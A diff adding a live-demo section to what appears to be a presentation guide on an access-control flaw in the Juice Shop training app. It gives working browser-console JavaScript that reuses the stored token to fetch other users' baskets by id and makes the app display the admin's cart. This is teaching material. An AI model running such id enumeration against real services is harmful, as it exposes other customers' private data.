@@ -87,6 +87,40 @@ curl -s "$JUICE/rest/basket/2" -H "Authorization: Bearer $TOKEN" | jq .
 
 You receive baskets that aren't yours.
 
+**Browser demo (two beats).** Do this logged in as a normal throwaway user
+(`demo@demo.com` / anything — email isn't verified) so the point is *horizontal*
+access. Validated live: baskets `1`–`6` are populated (basket `1` = UserId 1 / admin,
+3 products — the fullest; `7`+ are empty).
+
+*Beat 1 — the API leaks raw data.* In DevTools → Console on the juice-shop tab:
+
+```js
+// juice-shop stores the JWT quote-wrapped, so JSON.parse strips the quotes
+let t = localStorage.getItem('token'); try { t = JSON.parse(t); } catch (e) {}
+fetch('/rest/basket/1', { headers: { Authorization: 'Bearer ' + t } })
+  .then(r => r.json()).then(console.log);
+```
+
+Expand the result: products plus a `UserId` that isn't yours. Change `1` → `2` and
+re-run to show enumeration across users. (The `JSON.parse` is juice-shop plumbing, not
+the vuln — the point is the server never checks that the basket belongs to you. The
+raw `curl` above sidesteps the quote issue if you'd rather not explain it on stage.)
+
+*Beat 2 — the app renders someone else's cart.* The console fetch only prints JSON; it
+does not repaint the page. To make the UI itself show another user's basket, force the
+app's own basket id and let it re-fetch:
+
+```js
+sessionStorage.getItem('bid');      // confirm YOUR basket id
+sessionStorage.setItem('bid', '1'); // point the app at basket 1 (admin's)
+```
+
+Then click **Your Basket** (or reload the basket route) — the app calls
+`GET /rest/basket/1` itself and renders admin's items as if they were yours.
+
+> **Storage gotcha:** some versions keep `bid` in `localStorage`, not `sessionStorage`.
+> If `sessionStorage.getItem('bid')` is `null`, set it on `localStorage` instead.
+
 **What the attacker gains.** Horizontal privilege escalation — read other customers'
 cart/order data. Enumerating ids = bulk data harvesting across the user base.
 
